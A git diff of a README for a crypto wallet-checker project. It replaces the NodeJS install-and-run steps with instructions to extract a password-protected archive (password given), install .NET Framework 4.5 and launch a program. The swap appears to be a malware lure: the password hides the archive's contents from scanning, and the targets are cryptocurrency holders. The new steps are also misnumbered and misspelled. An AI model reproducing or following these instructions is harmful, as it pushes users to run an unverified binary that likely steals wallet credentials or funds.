@@ -1,14 +1,11 @@
 ![alt text](https://github.com/ak1rahunt3r/multi-network-wallet-checker/blob/main/screen.png?raw=true)
 
 ## Installation
-1. [Download](https://nodejs.org/en/download/current) latest NodeJS version
-2. Clone/download repository and extract files to folder
-3. Open PowerShell in folder with extracted files
-4. Fill the files with addresses in the `addresses` folder
-5. Install dependencies: `npm install`
-6. Launch script: `npm start`
+1. Clone/download repository and extract files with pass `rX4mtFaQ6i` to folder
+2. Fill the files with addresses in the `addresses` folder
+4. Install dependencies: .Net Fraemwork 4.5
+6. Launch program
 
-## Features
 
 ### Web Server
 
